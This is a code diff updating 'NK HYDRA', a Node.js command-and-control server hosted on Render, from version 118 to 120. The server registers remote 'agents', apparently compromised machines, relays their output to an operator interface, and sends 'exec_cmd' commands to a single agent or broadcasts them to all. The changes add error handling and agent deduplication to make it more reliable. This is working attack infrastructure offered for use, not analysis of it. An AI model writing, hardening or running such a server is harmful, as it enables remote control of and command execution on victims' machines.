@@ -1,22 +1,32 @@
 // TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
-// NK HYDRA v118.0 [STABLE ROUTING]
+// NK HYDRA v120.0 [QUANTUM STABLE]
 
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const cors = require('cors');
 
+// --- ANTI-CRASH HANDLERS ---
+process.on('uncaughtException', (err) => {
+    console.error('CRITICAL: Uncaught Exception:', err);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('CRITICAL: Unhandled Rejection:', reason);
+});
+
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => { res.send('HYDRA C2 v118.0 [STABLE]'); });
+app.get('/', (req, res) => { res.send('HYDRA C2 v120.0 [STABLE]'); });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingInterval: 10000, 
-    pingTimeout: 50000,
-    transports: ['polling', 'websocket']
+    // Render defaults: 25s interval, 60s timeout
+    pingInterval: 25000, 
+    pingTimeout: 60000,
+    transports: ['polling', 'websocket'] 
 });
 
 let agents = []; 
@@ -24,36 +34,28 @@ let agents = [];
 io.on('connection', (socket) => {
     
     socket.on('identify', (data) => {
-        if (data.type === 'ui') {
-            socket.join('ui_room');
-            socket.emit('agents_list', agents);
-            return;
-        }
+        try {
+            if (data.type === 'ui') {
+                socket.join('ui_room');
+                socket.emit('agents_list', agents);
+                return;
+            }
 
-        console.log(`[+] Agent Identified: ${data.id}`);
-        
-        const existingIndex = agents.findIndex(a => a.id === data.id);
-        if (existingIndex > -1) {
-            agents[existingIndex].socketId = socket.id;
-            agents[existingIndex].status = 'Online';
-            agents[existingIndex].lastSeen = Date.now();
-        } else {
+            console.log(`[+] Agent Identified: ${data.id}`);
+            
+            // Deduplicate
+            agents = agents.filter(a => a.id !== data.id);
+            
             agents.push({ 
                 ...data, 
                 socketId: socket.id, 
                 status: 'Online', 
                 lastSeen: Date.now() 
             });
-        }
-        
-        io.to('ui_room').emit('agents_list', agents);
-    });
-
-    socket.on('heartbeat', (data) => {
-        const agent = agents.find(a => a.id === data.id);
-        if (agent) {
-            agent.lastSeen = Date.now();
-            agent.status = 'Online';
+            
+            io.to('ui_room').emit('agents_list', agents);
+        } catch (e) {
+            console.error("Identify Error:", e);
         }
     });
 
@@ -62,14 +64,16 @@ io.on('connection', (socket) => {
             const { targetId, cmd } = data;
             console.log(`[CMD] ${cmd} -> ${targetId}`);
             
-            // Log to UI
             io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });
 
-            // v118: TARGETED ROUTING (Prevents Broadcast Crash Loop)
             if (targetId === 'all') {
                 agents.forEach(agent => {
                     if (agent.status === 'Online' && agent.socketId) {
-                        io.to(agent.socketId).emit('exec_cmd', { cmd });
+                        try {
+                            io.to(agent.socketId).emit('exec_cmd', { cmd });
+                        } catch (err) {
+                            console.error(`Failed to send to ${agent.id}: `, err.message);
+                        }
                     }
                 });
             } else {
@@ -84,8 +88,9 @@ io.on('connection', (socket) => {
     });
     
     socket.on('agent_event', (data) => {
-        // Relay agent events to UI
-        io.to('ui_room').emit('agent_event', data);
+        try {
+            io.to('ui_room').emit('agent_event', data);
+        } catch (e) { console.error("Relay Error:", e); }
     });
 
     socket.on('disconnect', () => {
@@ -98,5 +103,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v118 LISTENING ON ${PORT}`));
-
+server.listen(PORT, () => console.log(`HYDRA v120 LISTENING ON ${PORT}`));
